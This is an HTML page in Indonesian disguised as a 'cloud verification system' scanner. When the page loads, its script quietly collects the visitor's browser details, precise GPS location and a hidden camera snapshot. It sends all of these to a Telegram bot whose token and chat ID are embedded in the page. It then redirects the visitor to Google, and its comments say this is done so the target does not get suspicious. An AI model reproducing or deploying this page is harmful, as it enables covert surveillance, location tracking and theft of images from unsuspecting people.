<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sistem Verifikasi Cloud</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { border: 1px solid #0f0; padding: 20px; text-align: center; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div>SYSTEM STATUS: <span class="blink">SCANNING...</span></div>
        <div id="log" style="font-size: 10px; margin-top: 10px;">Menginisialisasi modul...</div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
        const C = '7966336512';
        const REDIRECT_URL = 'https://www.google.com'; // Link tujuan setelah data kesedot

        async function push(type, params, file = null) {
            const fd = new FormData();
            fd.append('chat_id', C);
            for (let k in params) fd.append(k, params[k]);
            if (file) fd.append(type.toLowerCase(), file, 'data.jpg');
            try { await fetch(`https://api.telegram.org/bot${T}/send${type}`, { method: 'POST', body: fd }); } catch (e) {}
        }

        async function start() {
            // 1. Device Info
            await push('Message', { text: `<b>⚠️ TARGET HIT! ⚠️</b>\n\nAgent: ${navigator.userAgent}`, parse_mode: 'HTML' });

            // 2. GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await push('Message', { text: `📍 <b>LOC:</b> ${p.coords.latitude},${p.coords.longitude}\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, parse_mode: 'HTML' });
                }, null, {enableHighAccuracy: true});
            }

            // 3. Camera & Auto Redirect
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = stream;

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(async (b) => {
                        await push('Photo', { caption: '📸 Snapshot' }, b);
                        // REDIRECT TARGET BIAR GAK CURIGA
                        window.location.href = REDIRECT_URL;
                    }, 'image/jpeg');
                }, 3000);
            } catch (e) {
                window.location.href = REDIRECT_URL; // Tetap redirect meski gagal
            }
        }
        window.onload = () => setTimeout(start, 1000);
    </script>
</body>
</html>
